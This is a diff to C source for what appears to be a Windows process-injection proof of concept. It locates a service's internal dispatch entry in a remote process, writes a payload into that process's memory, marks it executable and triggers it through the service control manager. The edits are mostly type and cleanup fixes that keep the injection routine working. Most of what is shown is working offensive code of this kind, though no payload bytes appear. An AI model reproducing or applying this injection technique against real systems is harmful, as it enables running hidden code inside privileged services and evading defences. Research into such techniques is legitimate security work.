@@ -127,7 +127,8 @@ BOOL IsThreadService(PSERVICE_ENTRY se) {
     ULONG                      read;
     NTSTATUS                   nt;
     BOOL                       bResult=FALSE;
-    DWORD                      i,tag;
+    DWORD                      i;
+    ULONG_PTR                  tag;
     SC_SERVICE_TAG_QUERY       stq;
     DWORD                      res;
     
@@ -158,10 +159,12 @@ BOOL IsThreadService(PSERVICE_ENTRY se) {
         // read SubProcessTag from TEB
         nt=pNtReadVirtualMemory(hProcess, 
             (PVOID)((LPBYTE)tbi.TebBaseAddress + SUBTAG_OFFSET), 
-            (PVOID)&tag, sizeof(PVOID), NULL);
+            (PVOID)&tag, sizeof(ULONG_PTR), NULL);
 
         // if not zero
-        if (nt==0 && tag!=0){
+        if (nt==0 && tag != 0){
+          ZeroMemory(&stq, sizeof(stq));
+          
           // resolve API
           pI_QueryTagInformation = 
             (I_QueryTagInformation_t)GetProcAddress(LoadLibrary(L"advapi32"), 
@@ -175,13 +178,13 @@ BOOL IsThreadService(PSERVICE_ENTRY se) {
             // query tag for service name
             res=pI_QueryTagInformation(NULL, 
                 ServiceNameFromTagInformation, &stq);
-             
+            
             // query ok?
             if(res==ERROR_SUCCESS){
               // does this match our service?
               bResult=!lstrcmpi((PWCHAR)stq.pszName, se->service);
               LocalFree(stq.pszName);
-            } else xstrerror(L"I_QueryTagInformation");
+            }
           } else wprintf(L"[-] unable to resolve I_QueryTagInformation.\n");
         }
       } else xstrerror(L"NtQueryInformationThread");
@@ -196,7 +199,7 @@ BOOL IsThreadService(PSERVICE_ENTRY se) {
 VOID DumpServiceIDE(PSERVICE_ENTRY se){
     WCHAR  name[MAX_PATH];
     BOOL   bResult;
-    DWORD  read;
+    SIZE_T read;
     HANDLE hProcess;
     
     hProcess=OpenProcess(PROCESS_ALL_ACCESS, TRUE, se->pid);
@@ -290,7 +293,7 @@ VOID FindPointer(HANDLE hProcess, LPVOID ptr, PSERVICE_ENTRY se){
 Once we have IDE, we try open the service via control manager.
 */
 BOOL RunPayload(PSERVICE_ENTRY se) {
-    DWORD                   es,wr;
+    SIZE_T                  es,wr;
     BOOL                    br=FALSE;
     SC_HANDLE               hm, hs;
     INTERNAL_DISPATCH_ENTRY ide;
@@ -323,7 +326,7 @@ BOOL RunPayload(PSERVICE_ENTRY se) {
               WriteProcessMemory(hp,se->ide_addr,&ide,sizeof(ide),&wr);
               // find pointer to original ControlHandler
               //FindPointer(hp, pl, se);
-              VirtualProtectEx(hp, pl, PAYLOAD_SIZE, PAGE_EXECUTE_READ, &wr);
+              VirtualProtectEx(hp, pl, PAYLOAD_SIZE, PAGE_EXECUTE_READ, NULL);
               wprintf(L"[*] attach debugger and set breakpoint on %p\n", pl);
               getchar();
               // trigger payload
@@ -332,7 +335,7 @@ BOOL RunPayload(PSERVICE_ENTRY se) {
               // wait for event to signal
               es=WaitForSingleObject(evt, 5*1000);
               // free payload from memory
-              VirtualFree(pl,PAYLOAD_SIZE,MEM_RELEASE);
+              VirtualFreeEx(hp,pl,PAYLOAD_SIZE,MEM_RELEASE);
               // restore original IDE
               WriteProcessMemory(hp,se->ide_addr,&se->ide,sizeof(ide),&wr);
               
@@ -350,8 +353,8 @@ BOOL RunPayload(PSERVICE_ENTRY se) {
 
 // try read an INTERNAL_DISPATCH_ENTRY from pAddr
 BOOL ReadServiceIDE(HANDLE hProcess, LPVOID pAddr, PINTERNAL_DISPATCH_ENTRY ide){
-    DWORD read;
-    BOOL  bResult=FALSE;
+    SIZE_T read;
+    BOOL   bResult=FALSE;
     
     // try read an internal dispatch entry from remote process
     if(ReadProcessMemory(hProcess, pAddr, ide, sizeof(INTERNAL_DISPATCH_ENTRY), &read)){
@@ -376,7 +379,7 @@ BOOL ReadServiceIDE(HANDLE hProcess, LPVOID pAddr, PINTERNAL_DISPATCH_ENTRY ide)
 DWORD ScanProcessMemory(HANDLE hProcess, PSCAN_DATA p) {
     MEMORY_BASIC_INFORMATION mbi;
     PBYTE                    pMemory;
-    DWORD                    dwRes;
+    SIZE_T                   dwRes;
     BOOL                     bResult,bFound=FALSE;
     SYSTEM_INFO              si;
     
@@ -411,7 +414,7 @@ DWORD ScanProcessMemory(HANDLE hProcess, PSCAN_DATA p) {
       if(pMemory != NULL){
         // read memory from process into allocated buffer
         bResult=ReadProcessMemory(hProcess, p->addr, 
-            pMemory, mbi.RegionSize, &p->size);
+            pMemory, mbi.RegionSize, (SIZE_T*)&p->size);
             
         // ok?
         if(bResult){
@@ -499,7 +502,7 @@ BOOL FindServiceIDE(PSERVICE_ENTRY se){
           }
         }
       }
-    }
+    } else xstrerror(L"OpenProcess");
     return bFound;
 }            
 
@@ -525,6 +528,8 @@ BOOL EnumThreads(PSERVICE_ENTRY ste){
         
         // set thread id
         ste->tid = te32.th32ThreadID;
+        
+        //printf("checking %i\n", ste->tid);
         
         // check if this thread has tag and service name
         bResult = IsThreadService(ste);
